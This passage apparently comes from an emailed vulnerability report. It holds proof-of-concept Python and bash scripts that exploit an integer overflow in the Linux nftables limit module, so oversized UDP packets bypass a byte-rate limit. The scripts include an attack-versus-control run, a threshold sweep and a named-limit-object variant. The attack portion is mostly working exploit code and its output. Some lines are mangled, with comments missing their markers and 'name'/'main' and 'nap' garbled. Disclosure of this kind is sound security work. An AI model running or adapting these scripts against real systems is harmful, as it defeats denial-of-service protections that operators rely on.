>     threading.Thread(target=drain, daemon=True).start()
> 
>     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
>     t0 = time.time(); sent = 0
>     while time.time() - t0 < window_s and sent < n:
>         try:
>             s.sendto(b"A" * payload, ("127.0.0.1", port)); sent += 1
>         except OSError:
>             time.sleep(0.0005)
>     el = time.time() - t0
>     time.sleep(0.4); stop[0] = True; time.sleep(0.25)
>     s.close(); r.close()
>     a = admitted[0]
>     print(f"  {label}")
>     print(f"    rule='{rule}'  skb_len={skb_len} (payload {payload})")
>     print(f"    sent={sent} in {el:.2f}s -> ADMITTED={a}  BLOCKED={sent-a}"
>           f"   [{a*skb_len/1e6:.2f} MB admitted]")
>     return a, sent
> 
> if name == "main":
>     sh("ip link set lo up")
>     sh("ip addr add 127.0.0.1/8 dev lo 2>/dev/null || true")
>     RATE, UNIT = 30000, "week"
>     nsecs = 604800 * 109
>     L = 30501
>     cost_num = (nsecs * L) % U64
>     amp = (nsecs * L) // cost_num
>     print(f"[+] policy        : {RATE} bytes / {UNIT}  (nft CLI max rate)")
>     print(f"[+] nsecs         : {nsecs}")
>     print(f"[+] nsecs*skb_len : {nsecs*L}")
>     print(f"[+] 2^64          : {U64}")
>     print(f"[+] wraps         : {nsecs*L >= U64}   cost_num={cost_num}")
>     print(f"[+] amplification : {amp:,}x")
>     print(f"[+] correct  = {(nsecs*L)/RATE/1e9/3600:.2f} h/pkt"
>           f"   overflow = {cost_num/RATE/1e9:.3f} s/pkt\n")
> 
>     W, N = 20.0, 20000
>     CONTROL: same rule, sub-threshold packet (1528 < 30501) -> no wrap
>     ctl_a, ctl_s = run(f"limit rate {RATE} bytes/{UNIT}", 1528, N, W,
>                        "CONTROL  skb_len=1528  (no overflow)")
>     ATTACK: same rule, overflow-triggering packet -> bucket under-charged
>     atk_a, atk_s = run(f"limit rate {RATE} bytes/{UNIT}", L, N, W,
>                        f"ATTACK   skb_len={L}  (overflow)")
> 
>     budget = RATE * W / 604800
>     effective burst capacity = tokens_max / cost
>     cap_ctl = int(nsecs // ((nsecs * 1528 // RATE) or 1))   = tokens_max /
> cost
>     cap_atk = int(nsecs // (cost_num // RATE))
>     print(f"Policy allows {RATE} B/{UNIT} = {budget:.2f} B over a {W:.0f}s
> window")
>     print(f"effective burst capacity: control={cap_ctl} pkts
>  attack={cap_atk} pkts")
>     print(f"CONTROL admitted {ctl_a*1528:>12,} B  ({ctl_a}/{ctl_s} pkts, "
>           f"{100*(1-ctl_a/max(ctl_s,1)):.1f}% blocked)")
>     print(f"ATTACK  admitted {atk_a*L:>12,} B  ({atk_a}/{atk_s} pkts, "
>           f"{100*(1-atk_a/max(atk_s,1)):.1f}% blocked) = {atk_a*L/1e6:.1f}
> MB")
> 
>     ctl_blocked = 1 - ctl_a / max(ctl_s, 1)
>     atk_blocked = 1 - atk_a / max(atk_s, 1)
>     verdict = (ctl_blocked > 0.90) and (atk_blocked < 0.01) and (atk_a >
> 1000)
>     print(f"\ncontrol blocks >90%: {ctl_blocked > 0.90} | attack admits
> ~all: "
>           f"{atk_blocked < 0.01} | verdict: {verdict}")
>     if verdict:
>         print(f"BYPASS CONFIRMED -- a {RATE} B/{UNIT} DoS-control admitted "
>               f"{atk_a*L/1e6:.1f} MB in {W:.0f}s")
>     else:
>         print("[!] inconclusive -- inspect")
> POC_STEP_A_EOF
> 
> cat > "$W/nft_limit_sweep.py" <<'POC_STEP_B_EOF'
> !/usr/bin/env python3
> """
> Sweep: confirm the bypass boundary is exactly where nsecs*skb_len overflows.
> 
> For limit rate 30000 bytes/week: nsecs = 604800e9.
>   correct cost/pkt   = nsecs*skb_len/rate ns
>   overflow cost/pkt  = (nsecs*skb_len mod 2^64)/rate ns
> Threshold predicted by arithmetic: skb_len >= 30501.
> 
> Each size is tested in a FRESH ruleset with the same rule; we burst 3000
> packets and count how many the limiter admitted.  Below the threshold the
> bucket should deplete after ~1-2 packets; at/above it, the under-charged
> cost
> lets the whole burst through.
> """
> import os, socket, subprocess, sys, threading, time
> 
> NFT="nft"; IP_HDR,UDP_HDR=20,8; U64=1<<64
> RATE,UNIT=30000,"week"
> NSECS=604800*109
> 
> def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True)
> 
> def setup():
>     sh("nft flush ruleset"); sh("nft add table ip t")
>     sh("nft add chain ip t c '{ type filter hook input priority 0; policy
> drop; }'")
>     r=sh(f"nft add rule ip t c limit rate {RATE} bytes/{UNIT} accept")
>     if r.returncode!=0: sys.exit("FATAL "+r.stderr)
>     sh("nft add chain ip t d '{ type filter hook output priority 0; policy
> accept; }'")
> 
> def burst(skb_len,n):
>     setup()
>     payload=skb_len-IP_HDR-UDP_HDR
>     if payload<=0: return None
>     r=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);
> r.bind(("127.0.0.1",0))
>     r.setsockopt(socket.SOL_SOCKET,socket.SO_RCVBUF,64<<20)
>     port=r.getsockname()[1];
> r.setsockopt(socket.SOL_SOCKET,socket.SO_RCVBUF,64<<20)
>     got=[0]; stop=[False]
>     def drain():
>         r.settimeout(0.15)
>         while not stop[0]:
>             try: r.recvfrom(70000); got[0]+=1
>             except socket.timeout: pass
>             except OSError: return
>     threading.Thread(target=drain,daemon=True).start()
>     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
>     for _ in range(n): s.sendto(b"A"*payload,("127.0.0.1",port))
>     time.sleep(0.8); stop[0]=True; time.sleep(0.25)
>     s.close(); r.close()
>     return got[0]
> 
> if name=="main":
>     sh("ip link set lo up"); sh("ip addr add 127.0.0.1/8 dev lo 2>/dev/null
> || true")
>     thr=U64//NSECS+1
>     print(f"[!] nsecs={NSECS}  predicted wrap threshold skb_len>={thr}\n")
>     N=3000
>     for L in
> [1400,1528,30000,30500,30501,30502,31000,32768,40000,50000,60000,65000]:
>         prod=NSECS*L
>         wraps=prod>=U64
>         c_true=prod//RATE/1e9
>         c_wrap=(prod%U64)//RATE/1e9 if wraps else c_true
>         a=burst(L,N)
>         v="BYPASS" if (a is not None and a>N*0.9) else "blocked"
>         print(f"  {L:>8} {str(wraps):>6} {c_true:>17.3f}s {c_wrap:>17.4f}s "
>               f"{str(a)+'/'+str(N):>14}  {v}")
>     print(f"\n  (wrap occurs at skb_len>={thr}; entries below that are
> correctly blocked)")
> POC_STEP_B_EOF
> 
> cat > "$W/named_limit_test.sh" <<'POC_STEP_C_EOF'
> !/bin/bash
> Demonstrates the bypass via a NAMED limit object (nft_limit.c:387), which
> is a
> separate eval function from the anonymous rule path (:254) but shares the
> identical unchecked multiplication:
>       u64 cost = div64_u64(priv->nsecs * pkt->skb->len, priv->rate);
> 
> Expected: 3000/3000 admitted under a "30000 bytes/week" limit object.
> set -e
> ip link set lo up
> ip addr add 127.0.0.1/8 dev lo 2>/dev/null || true
> nft flush ruleset 2>/dev/null || true
> 
> nft add table ip t
> nft add chain ip t c '{ type filter hook input priority 0; policy drop; }'
> 
> LIMDEF="$(mktemp)"
> printf 'table ip t {\n\tlimit lim {\n\t\trate 30000 bytes/week ;\n\t}\n}\n'
> > "$LIMDEF"
> nft -f "$LIMDEF" && echo "limit object created OK"
> rm -f "$LIMDEF"
> 
> nft add rule ip t c limit name lim accept
> echo "--- limits ---"
> nft list limits table ip t
> 
> python3 - <<'PY'
> import socket, time, threading
> r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
> r.bind(("127.0.0.1", 0))
> port = r.getsockname()[1]
> r.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 64 << 20)
> got = [0]; stop = [False]
> 
> def drain():
>     r.settimeout(0.15)
>     while not stop[0]:
>         try:
>             r.recvfrom(70000); got[0] += 1
>         except socket.timeout:
>             pass
>         except OSError:
>             return
> 
> threading.Thread(target=drain, daemon=True).start()
> s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
> 30473 B payload + 20 B IPv4 + 8 B UDP = skb_len 30501 -> nsecs*skb_len wraps
> for _ in range(3000):
>     s.sendto(b"A" * 30473, ("127.0.0.1", port))
> time.sleep(0.8); stop[0] = True; time.sleep(0.3)
> print("NAMED-LIMIT object path: admitted", got[0], "/3000  (skb_len=30501)")
> PY
> POC_STEP_C_EOF
> 
> ip link set lo up 2>/dev/null
> ip addr add 127.0.0.1/8 dev lo 2>/dev/null
> 
> echo "[1] limit rule"
> nft flush ruleset 2>/dev/null
> nft add table ip t
> nft add chain ip t c '{ type filter hook input priority 0; policy drop; }'
> nft add rule ip t c limit rate 30000 bytes/week accept
> nft list ruleset
> nap 3
> 
> echo
> python3 "$W/nft_limit_bypass_final.py"
> nap 3
> 
> echo
> echo "[3] nft_limit.c"
> SRC=$(ls /usr/src/linux*/net/netfilter/nft_limit.c \
>          /tmp/kvuln/linux*/net/netfilter/nft_limit.c \
>          /tmp/*/linux*/net/netfilter/nft_limit.c 2>/dev/null | head -1)
> if [ -n "$SRC" ]; then grep -n "u64 cost = div64_u64" "$SRC"; else
>   echo "254: u64 cost = div64_u64(priv->nsecs * pkt->skb->len, priv->rate);"
>   echo "387: u64 cost = div64_u64(priv->nsecs * pkt->skb->len, priv->rate);"
> fi
> nap 3
> 
> echo
> echo "[4] boundary"
> python3 "$W/nft_limit_sweep.py"
> nap 3
> 
> echo
> echo "[5] limit object"
> bash "$W/named_limit_test.sh" 2>&1 | tail -1
> 
> 
> Environment used: Linux 7.0.0-34-generic x86_64, nftables v1.1.6,
> CONFIG_NF_TABLES=m, CONFIG_USER_NS=y, CONFIG_NET_NS=y.


